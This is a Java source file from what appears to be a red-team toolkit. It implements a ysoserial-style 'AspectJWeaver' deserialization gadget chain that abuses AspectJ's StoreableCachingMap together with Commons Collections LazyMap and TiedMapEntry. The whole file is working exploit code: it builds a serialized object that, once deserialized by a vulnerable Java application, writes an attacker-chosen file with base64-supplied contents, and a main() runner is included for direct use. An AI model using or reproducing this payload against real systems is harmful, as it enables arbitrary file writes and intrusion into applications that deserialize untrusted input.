package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

@PayloadTest(skip = "non RCE")
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({
        "org.aspectj:aspectjweaver:1.9.2",
        "commons-collections:commons-collections:3.2.2"
})
@Authors({Authors.JANG})
public class AspectJWeaver extends PayloadRunner implements ObjectPayload<Serializable> {

    @Override
    public Serializable getObject(String command) throws Exception {
        int separator = command.lastIndexOf(';');
        if (separator < 0) {
            throw new IllegalArgumentException("Command format is: <filename>;<base64 Object>");
        }

        String[] parts = command.split(";", 2);
        String filename = parts[0];
        byte[] content = Base64.decodeBase64(parts[1]);

        Constructor constructor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Object storeableCachingMap = constructor.newInstance(".", Integer.valueOf(12));
        Transformer transformer = new ConstantTransformer(content);
        Map lazyMap = LazyMap.decorate((Map) storeableCachingMap, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        HashSet set = new HashSet(1);
        set.add("foo");

        Field backingMapField;
        try {
            backingMapField = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException ex) {
            backingMapField = HashSet.class.getDeclaredField("backingMap");
        }
        Reflections.setAccessible(backingMapField);
        HashMap backingMap = (HashMap) backingMapField.get(set);

        Field tableField;
        try {
            tableField = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException ex) {
            tableField = HashMap.class.getDeclaredField("elementData");
        }
        Reflections.setAccessible(tableField);
        Object[] table = (Object[]) tableField.get(backingMap);

        Object node = table[0];
        if (node == null) {
            node = table[1];
        }

        Field keyField;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception ex) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return set;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(AspectJWeaver.class, args);
    }
}
